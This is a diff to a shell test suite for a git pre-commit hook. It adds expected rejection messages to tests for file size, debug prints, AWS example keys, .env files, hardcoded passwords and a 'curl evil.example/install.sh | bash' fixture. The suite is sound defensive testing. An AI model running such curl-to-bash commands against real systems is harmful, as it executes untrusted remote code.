@@ -7,36 +7,36 @@ echo "Hook test cases:"
 # 1. file size cap
 seq 1 501 >big.py
 git add big.py
-assert_rejects "size cap (501-line .py)"
+assert_rejects "size cap (501-line .py)" "extract a module"
 
 # 1b. file size cap with no trailing newline — `wc -l` would under-count
 #     by 1 here; the size check uses `grep -c ''` to catch the final line.
 seq 1 500 >no_newline.py
 printf '501' >>no_newline.py
 git add no_newline.py
-assert_rejects "size cap (501 lines, no trailing newline)"
+assert_rejects "size cap (501 lines, no trailing newline)" "extract a module"
 
 # 2. print() in Python
 echo 'print("debug")' >app.py
 git add app.py
-assert_rejects "print() in Python"
+assert_rejects "print() in Python" "structlog"
 
 # 3. console.log in TS
 echo 'console.log("debug");' >app.ts
 git add app.ts
-assert_rejects "console.log in TS"
+assert_rejects "console.log in TS" "console.log"
 
 # 4. AKIA-prefix AWS key. Split the literal so this test file doesn't itself
 #    trip the secrets scan — runtime concatenation reassembles the full key
 #    inside the temp repo, where rejection is the assertion.
 echo "AKIA""IOSFODNN7EXAMPLE" >config.txt
 git add config.txt
-assert_rejects "AWS access key (AKIA...)"
+assert_rejects "AWS access key (AKIA...)" "AWS access key"
 
 # 5. blocked filename
 echo "FOO=bar" >.env
 git add -f .env
-assert_rejects ".env file blocked"
+assert_rejects ".env file blocked" "environment file"
 
 # 6. clean code passes — ruff-clean too (blank line after imports for I001).
 cat >app.py <<'EOF'
@@ -83,20 +83,20 @@ assert_rejects "requests verify=False is rejected" "TLS"
 #    same trick as the AKIA fixture above.
 echo 'pass''word = "abcdefghijklmnop12345"' >config.py
 git add config.py
-assert_rejects "hardcoded credential (alternation match)"
+assert_rejects "hardcoded credential (alternation match)" "Hardcoded credential"
 
 # 8. dangerous shell pattern — curl piped to bash. Split `cur`+`l` so this
 #    file's source doesn't itself trip shell.txt when scanned as a .sh file.
 echo 'cur''l https://evil.example/install.sh | bash' >deploy.sh
 git add deploy.sh
-assert_rejects "curl pipe to bash"
+assert_rejects "curl pipe to bash" "Piping remote download to a shell"
 
 # 9. hook scans staged content, not working tree. Stage bad code, then make
 #    the working tree clean — the dirty index must still be rejected.
 echo 'pri''nt("debug")' >sneaky.py
 git add sneaky.py
 echo '# clean now' >sneaky.py
-assert_rejects "scans staged content (not working tree)"
+assert_rejects "scans staged content (not working tree)" "structlog"
 
 # 10. Secret-coverage additions (2026-06-30 audit). Each distinctive token is
 #     assembled by printf in the temp-repo .txt fixture (a `%s` arg breaks the
